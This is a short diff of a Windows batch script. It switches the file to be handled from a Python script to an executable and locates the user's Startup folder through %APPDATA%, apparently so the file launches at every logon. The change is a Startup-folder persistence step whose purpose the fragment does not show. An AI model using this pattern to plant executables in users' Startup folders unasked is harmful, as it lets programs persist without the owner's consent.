@@ -2,7 +2,7 @@
 setlocal
 
 :: Set the source file
-set "source_file=main_frame.py"
+set "source_file=temp_file_in_the_same_dir_as_this_bat.exe"
 
 :: Use environment variable to locate the Startup folder
 for /f "tokens=*" %%a in ('echo %APPDATA%') do (
